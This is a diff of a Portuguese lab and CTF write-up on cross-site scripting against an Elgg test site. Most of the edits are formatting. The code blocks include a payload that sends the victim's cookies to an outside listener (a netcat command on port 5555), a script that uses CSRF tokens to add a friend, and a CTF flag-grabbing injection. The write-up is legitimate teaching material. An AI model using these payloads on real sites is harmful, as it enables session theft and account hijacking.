@@ -16,7 +16,7 @@ Experimentou-se também com o exemplo usando um *form* e apesar de apenas se usa
 ## Tarefa 2
 
 Alterou-se novamente a secção *Brief Description* desta vez para:
-``` js
+```html
 <script>alert(document.cookie);</script>
 ```
 
@@ -27,14 +27,14 @@ Como resultado, surgiu o *pop up* com as *cookies* do utilizador mal as alteraç
 ## Tarefa 3
 
 Inicialmente, na *shell*, correu-se o seguinte comando por forma a iniciar o servidor TCP:
-``` shell
+```sh
 nc -lknv 5555
 ```
 
 Seguidamente mudou-se *Brief Description* para efetuar o ataque:
 
-``` js
-<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >'); </script>
+```html
+<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');</script>
 ```
 
 Após guardar as alterações no perfil, verificou-se a chegada das *cookies* do utilizador autenticado, neste caso, da Alice ao terminal onde se tinha iniciado o servidor.
@@ -54,20 +54,23 @@ Por forma a perceber como executar o ataque, foi necessário compreender como fu
 
 ![/imgs10/amizadeAliceBob.png](/imgs10/amizadeAliceBob.png)
 
-Com a repetição de pedidos percebeu-se que a variável *friend* era igual a um identificador para a pessoa que se queria adicionar como amiga. Por outro lado, a restante parte do *link* era constituída pela sequência *ts*, *token*, *ts* e *token* que são calculados no *script* fornecido. Como tal, bastava modificar o script para
+Com a repetição de pedidos percebeu-se que a variável *friend* era igual a um identificador para a pessoa que se queria adicionar como amiga. Por outro lado, a restante parte do *link* era constituída pela sequência *ts*, *token*, *ts* e *token* que são calculados no *script* fornecido. Como tal, bastava modificar o script para:
 
-```js
+```html
 <script type="text/javascript">
 window.onload = function () {
-var Ajax=null;
-var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
-var token="&__elgg_token="+elgg.security.token.__elgg_token;
-//Construct the HTTP request to add Samy as a friend.
-var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token;
-//Create and send Ajax request to add friend
-Ajax=new XMLHttpRequest();
-Ajax.open("GET", sendurl, true);
-Ajax.send();
+    var Ajax=null;
+
+    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
+    var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+    //Construct the HTTP request to add Samy as a friend.
+    var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token;
+    
+    //Create and send Ajax request to add friend
+    Ajax=new XMLHttpRequest();
+    Ajax.open("GET", sendurl, true);
+    Ajax.send();
 }
 </script>
 ```
@@ -85,18 +88,18 @@ Em Elgg, as todas as ações requerem *tokens* CSRF (por questões de segurança
 
 ### Questão 2
 
-Se apenas fosse usado *Editor Mode*, o texto inserido teria os sues carateres especiais "<", ">" codificados como se mostra abaixo.
+Se apenas fosse usado *Editor Mode*, o texto inserido teria os seus carateres especiais como "<" e ">" codificados como se mostra abaixo:
 
 ![/imgs10/editorMode.png](/imgs10/editorMode.png)
 
 Desta forma, o código não seria reconhecido como *script* e, logo, não seria possível corrê-lo.
 
 ## CTF - Desafio 1
-O enunciado sugere que o formulário de se procurem fragilidades no formulário de submissão. 
+O enunciado sugere que se procurem fragilidades no formulário de submissão. 
 
-Tentou-se *SQLInjection* sem sucesso. Com mais sucesso, ao colocar 
-``` js
-<script> alert("hello");</script>
+Tentou-se *SQLInjection* sem sucesso. Com mais sucesso, ao colocar: 
+```html
+<script>alert("hello");</script>
 ```
 
 surgiu no ecrã :
@@ -111,17 +114,19 @@ Desta forma tentou-se replicar o comportamento deste botão em *JavaScript*.
 
 Assim, injetou-se o seguinte código no formulário: 
 
-``` js
-<script> getFlag = function () {
+```html
+<script>
+getFlag = function () {
     var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "POST", "");
+    xmlHttp.open("POST", "");
     xmlHttp.send("giveflag");
-    return xmlHttp.responseText; }; 
-    console.log(getFlag())
-    </script>
+    return xmlHttp.responseText;
+};
+console.log(getFlag());
+</script>
 ```
 
-Inicialmente, nada surgiu, mas, mal o pedido foi avaliado, a *flag* surgiu no ecrã
+Inicialmente, nada surgiu, mas, mal o pedido foi avaliado, a *flag* surgiu no ecrã:
 
 ![/imgs10/flag1.png](/imgs10/flag1.png)
 
